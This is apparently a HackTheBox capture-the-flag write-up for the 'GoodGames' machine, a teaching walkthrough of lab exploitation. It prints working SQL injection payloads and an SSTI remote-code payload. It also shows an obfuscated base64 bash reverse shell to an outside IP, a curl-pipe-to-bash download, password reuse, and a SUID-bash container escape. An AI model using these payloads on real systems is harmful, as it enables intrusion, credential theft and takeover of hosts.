---
render_with_liquid: false
title: HackTheBox Writeup  GoodGames
date: 2023-09-22 09:16:19 +1400
tags: [hackthebox, nmap, linux, httpx, feroxbuster, sqli, mysql, auth-bypass, burpsuite, burp-repeater, burp-intruder, subdomain, password-reuse, ssti, python, python-flask, docker, docker-escape, docker-mount, docker-abuse, deepce, sqlmap]
---



GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using `render_template_string` in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts enumeration and shows how having admin privileges in a container and a low privilege user on the host machine can be dangerous, allowing attackers to escalate privileges to compromise the system.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/GoodGames]
└─$ writehosts htb '10.129.69.208 goodgames.htb internal-administration.goodgames.htb'
+---------+--------+---------------+---------------------------------------+
| PROFILE | STATUS |      IP       |                DOMAIN                 |
+---------+--------+---------------+---------------------------------------+
| htb     | on     | 10.129.69.208 | goodgames.htb                         |
| htb     | on     | 10.129.69.208 | internal-administration.goodgames.htb |
+---------+--------+---------------+---------------------------------------+
```


## Scripts

```bash
┌──(bravosec㉿fsociety)-[~/htb]
└─$ webprobe
http://goodgames.htb [200] [GoodGames | Community and Store] [Werkzeug/2.0.2 Python/3.9.2] [Bootstrap,Flask:2.0.2,Python:3.9.2] [cb68a8eb8535cadde6047d5720907f9cbd25e069]
```

## Nmap

```bash

# Nmap 7.94 scan initiated Fri Sep 22 09:16:18 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80 goodgames.htb
Nmap scan report for goodgames.htb (10.129.69.208)
Host is up, received user-set (0.064s latency).
Scanned at 2023-09-22 09:16:19 CST for 8s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.48
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-title: GoodGames | Community and Store

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Sep 22 09:16:27 2023 -- 1 IP address (1 host up) scanned in 8.66 seconds
```


## 80 - Site : GoodGames | Community and Store


### Info

![](/assets/obsidian/9a2bc26d2efd5570c29a4e60e3e90420.png)

### Directory

```bash
feroxbuster -k -t 150 -u 'http://goodgames.htb' -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb]
└─$ cat ferox_80.txt|awk '$5!="9265c"'|grep -vE 'goodgames.htb/static/'
200      GET      909l     2572w    44212c http://goodgames.htb/blog
200      GET      730l     2069w    32744c http://goodgames.htb/forgot-password
302      GET        4l       24w      208c http://goodgames.htb/logout => http://goodgames.htb/
200      GET      728l     2070w    33387c http://goodgames.htb/signup
200      GET     1735l     5548w    85107c http://goodgames.htb/
403      GET        9l       28w      278c http://goodgames.htb/server-status
```


# User Flag
---

## SQLI - Login Bypass

![](/assets/obsidian/26a366bbd88ad8ab488290ba8200dbdb.png)

Capture the login request via burp suite and send to intruder

![](/assets/obsidian/a743a6207c91119dd69f111bc4d715e6.png)

I chose `/usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt` as fuzzing list

![](/assets/obsidian/5110422cc6b037e46f58421d767a53b2.png)

![](/assets/obsidian/b12f601b7c92e29decca634347b8713a.png)

Found login bypasses

![](/assets/obsidian/50cce3b4b1ebb68854f94a07acc5463b.png)

Set the cookies to the login succussed one

![](/assets/obsidian/cdd436228415086b8e56f4579af19ed8.png)

![](/assets/obsidian/5130d5e313a27f9ebcf64d1b3d75d382.png)

After refreshing the page, I have access to admin's account

![](/assets/obsidian/9488d23ef5f6eb1d304e7bad4072c286.png)

After clicking at the settings button on top right, it redirected me to `http://internal-administration.goodgames.htb/`; add that to hosts

![](/assets/obsidian/77e88012023120dc891ed1f777441d2c.png)

It requires username and password, I'll dump admin's password and try password reuse


## SQLI (Mysql) - Dump User Table


### Get columns count

```sql
' union select 1,2,3,4 #
```

![](/assets/obsidian/933b147c1b17dd5b90c81e54dfa93841.png)


### Get database and user info

> `@@version`, `database()`, `user()`

`@@version` worked, assume it's mysql

```sql
' union select 1,2,3,@@version #
```

![](/assets/obsidian/a6bfcde6e0e96ce75326eab9b302a07a.png)

User is `main_admin`

```sql
' union select 1,2,3,user() #
```

![](/assets/obsidian/8fa21b7ed8188e8b483e7f4ed1e4ee8f.png)

Current database is `main`

```sql
' union select 1,2,3,database() #
```

![](/assets/obsidian/05131c0f2aa5d5fa071eadf18237ea3b.png)

### Get tables from current database

```sql
' union select 1,2,3, group_concat(table_name) FROM information_schema.tables where table_schema = "main"#
```

![](/assets/obsidian/fc21c0fd55e044c0116c7c57b61e6f81.png)


### Get Columns from user table 

```sql
' union select 1,2,3, group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'main' and table_name = 'user'#
```

![](/assets/obsidian/658582502bb5ecd969cb7337ffe61c11.png)


### Dump data from user table

```sql
' union select 1,2,3, group_concat(name,":",password) FROM main.user#
```

![](/assets/obsidian/af2b985c24b349e5a70cbfcf6203d230.png)

> `admin`:`2b22337f218b2d82dfc3b6f77e7cb8ec`


## Recover the md5 hash of admin

It have 32 characters, assume it's md5

```bash
┌──(bravosec㉿fsociety)-[~/htb/GoodGames]
└─$ echo -n '2b22337f218b2d82dfc3b6f77e7cb8ec'|wc -c
32
```

> https://md5.gromweb.com

![](/assets/obsidian/b0cdc4ae4daa75b567e88e113c5c2785.png)

> `admin`:`superadministrator`


## SSTI at internal-administration.goodgames.htb


### Discover

Login to `http://nternal-administration.goodgames.htb`

![](/assets/obsidian/602d530cad76f94c6b4d9e8246919f4b.png)

> **Foothold**
> Note that this is a python application, and it might be using `Jinja/Flask` to render templates
> 
> Check some places where user input can be renderedContents
{: .prompt-info }

Confirmed SSTI at username field at user profile settings

![](/assets/obsidian/82f5fd7046e58aa046fae52a044bea31.png)

Use some payloads from [payloadallthethings]( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution) to check if RCE is possible

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![](/assets/obsidian/f8e07a7ddc57297f21ce077a7a067529.png)


### Shell as root in docker container

Generate reverse shell payload

```bash
┌──(bravosec㉿fsociety)-[~/htb/GoodGames]
└─$ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.16.10/1111 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0eE1DOHhNVEV4SURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

Send Payload

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0eE1DOHhNVEV4SURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h").read() }}
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/GoodGames]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.69.232] 38444
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/GoodGames]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

root@3a453ab39d3d:/backend# export TERM=xterm
root@3a453ab39d3d:/backend# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@3a453ab39d3d:/backend# cat /root/root.txt
cat: /root/root.txt: No such file or directory
root@3a453ab39d3d:/backend# ls -la /home
total 12
drwxr-xr-x 1 root root 4096 Nov  5  2021 .
drwxr-xr-x 1 root root 4096 Sep 22 07:26 ..
drwxr-xr-x 2 1000 1000 4096 Nov  3  2021 augustus
root@3a453ab39d3d:/backend# cat /home/augustus/user.txt
df0fc7b00a87b73fa4960385908e14cf
```

Since the hostname looks like container-generated, check if current environment is in docker

```bash
root@3a453ab39d3d:/backend# ls -latr /|grep .docker
-rwxr-xr-x   1 root root    0 Nov  5  2021 .dockerenv
```

Good news is we are root already, docker escape will be relatively easy

# Root Flag
---

## Docker Escape via ssh to host

Run some auto recon scripts first

```bash
root@3a453ab39d3d:/backend# curl 10.10.16.10/deepce.sh|bash
```

![](/assets/obsidian/41f88032a9079a1cd37114381efff2fe.png)

![](/assets/obsidian/ba4efb50e6149802657c9198d09c6d3c.png)

Scan ports opened on host machine

> Cheatsheet - https://github.com/0xsyr0/OSCP#port-scanning

```bash
root@3a453ab39d3d:/backend# export ip=172.19.0.1; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
The port 22 is open
The port 80 is open
```

It's weird that user `augustus` have a home directory, but can't login with a shell

```bash
root@3a453ab39d3d:/backend# cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
```

Try password reuse for ssh to host machine with `augustus`:`superadministrator`

```bash
root@3a453ab39d3d:/backend# ssh 172.19.0.1
root@172.19.0.1's password:

root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
augustus@172.19.0.1's password:
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ id
uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
```


## Docker Privesc via mounted folder

Check the arguments docker is using

```bash
augustus@GoodGames:~$ ps auxf|grep docker
root       686  0.0  2.0 1457424 83596 ?       Ssl  07:41   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1097  0.0  0.2 1222636 9624 ?        Sl   07:41   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
augustus  6855  0.0  0.0   6116   648 pts/0    S+   08:56   0:00              \_ grep docker
```

Home directory looks the same as in docker container

```bash
augustus@GoodGames:~$ ls -la
total 24
drwxr-xr-x 2 augustus augustus 4096 Nov  3  2021 .
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus   33 Sep 22 07:42 user.txt
```

Check by creating a file

```bash
augustus@GoodGames:~$ touch x
```

In container:

```bash
root@3a453ab39d3d:/home/augustus# ls
user.txt  x
```

The file did appeared, indicates that it's a mounted share folder between host and container

Now I can copy **bash** to the shared folder then give it SUID as root from the docker container

```bash
augustus@GoodGames:~$ cp /bin/bash .
```

```bash
root@3a453ab39d3d:/home/augustus# chown root:root ./bash
root@3a453ab39d3d:/home/augustus# chmod +s ./bash
```

Back to host machine

```bash
augustus@GoodGames:~$ ./bash -p
bash-5.0# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)
bash-5.0# cat /root/root.txt
01aa6d576109f59feb575cc2b9a5d574
```


# Additional
---

## Dump Admin Password via Sqlmap

> If specified batch mode, it **won't be able to find union based payloads**, which will slow down dumping speed a lot
{: .prompt-warning }

```bash
sqlmap -r login.req --batch
```

```bash
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 650 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=a' AND 7176=(SELECT (CASE WHEN (7176=7176) THEN 7176 ELSE (SELECT 7374 UNION SELECT 3570) END))-- Nbgo&password=a

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=a' AND (SELECT 5947 FROM (SELECT(SLEEP(5)))IhVs)-- BPad&password=a
---
[09:50:53] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[09:50:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/goodgames.htb'

```

```bash
sqlmap -r login.req --batch -D main -T user --dump
```

```bash
Database: main
Table: user
[254 entries]
+-----+-------------------------+--------+--------------------------------------+
| id  | email                   | name   | password                             |
+-----+-------------------------+--------+--------------------------------------+
| 1   | admin@goodgames.htb     | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec     |
+-----+-------------------------+--------+--------------------------------------+
```